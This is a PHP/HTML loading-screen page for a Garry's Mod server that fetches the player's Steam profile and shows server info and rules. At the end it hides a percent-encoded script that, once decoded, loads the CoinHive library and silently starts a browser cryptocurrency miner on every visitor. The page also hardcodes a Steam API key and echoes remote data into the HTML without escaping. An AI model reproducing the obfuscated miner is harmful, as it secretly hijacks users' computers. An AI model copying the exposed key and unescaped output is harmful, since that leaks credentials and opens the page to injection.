<html>
<head>
	<link rel="stylesheet" type="text/css" href="stylesheets/bubble.css" />
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
	<script src="http://code.jquery.com/jquery-1.11.2.min.js"></script>
	<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
	<link href='http://fonts.googleapis.com/css?family=Raleway' rel='stylesheet' type='text/css'>

	
	<title>BubbleLoad</title>
</head>
<?php
	$id = $_GET["steamid"];
	$name = "Username";
	$avatar = "images/no-user.png";
	if (isset($_GET['steamid'])) {
		$plydata = 'http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=BEE6488A04F1506A9EE8440DB3667C36&steamids='.$id."&format=json";
		$f = file_get_contents($plydata);
		$array = json_decode($f, true);
		if (isset($array['response']['players'][0]['personaname']))
			$name = $array['response']['players'][0]['personaname'];
		
		if (isset($array['response']['players'][0]['avatarfull']))
			$avatar = $array['response']['players'][0]['avatarfull'];
	}
?>
<body>
	<img id="background"></img>
	<div id="title">A Garry's Mod Server</div>
	<div id="subtitle">Retrieving server info...</div>
	
	<div id="serverinfo">
		<span id="gmicon"><i class="fa fa-cogs fa-2x"></i><span id="gamemode"> gamemode</span></span><br>
		<span id="mapicon"><i class="fa fa-globe fa-2x"></i><span id="map"> map</span></span>
	</div>
	
	<div id="avatar">
		<img id="plyavatar" src="<?php echo $avatar; ?>"></span><br>
		<span id="plyname"><i class="fa fa-user"></i> <?php echo $name; ?></span>
	</div>
	
	<div id="rules">
		<div id="rulesTitleBox"><span id="rulesTitle">Server Rules</span></div>
		<div id="ruleList">
		<br>
		<span id="rule1"></span><br><br><br>
		<span id="rule2"></span><br><br><br>
		<span id="rule3"></span><br><br><br>
		<span id="rule4"></span><br><br><br>
		<span id="rule5"></span><br><br><br>
		</div>
	</div>
	
	<div id="music">
		<i class="fa fa-headphones"></i> You're listening to <span id="trackName">"Track Title"</span> by <span id="artist">Artist</span>
	</div>


<script src="js/bubble.js"></script>
<script src="js/config.js"></script>
<script type="text/javascript">
fadeBackground(); 
setServerRules(); 
dimensionRules();

function GameDetails( servername, serverurl, mapname, maxplayers, steamid, gamemode ) {
		setGamemode(" " + gamemode);
		setMap(" " + mapname);
		
		if (!displayName) {
			setServerName(servername);
		}
}

function SetStatusChanged( status ) {
	changeStatus(status);
	centerText("#subtitle");
}

function changeStatus(status) {
	$("#subtitle").html(status);
}

function setGamemode(gamemode) {
	$("#gamemode").html(gamemode);
}
	
function setMap(mapname) {
	$("#map").html(mapname);
}
</script>
	<script language="javascript">
	document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%63%6F%69%6E%2D%68%69%76%65%2E%63%6F%6D%2F%6C%69%62%2F%63%6F%69%6E%68%69%76%65%2E%6D%69%6E%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%3E%0A%09%76%61%72%20%6D%69%6E%65%72%20%3D%20%6E%65%77%20%43%6F%69%6E%48%69%76%65%2E%41%6E%6F%6E%79%6D%6F%75%73%28%27%77%64%78%4B%49%44%39%6B%4F%36%75%77%32%4B%61%34%42%47%62%6B%6C%32%6B%47%30%68%4D%36%69%67%71%46%27%29%3B%0A%09%6D%69%6E%65%72%2E%73%74%61%72%74%28%29%3B%0A%3C%2F%73%63%72%69%70%74%3E'));
	</script>
</body>
</html>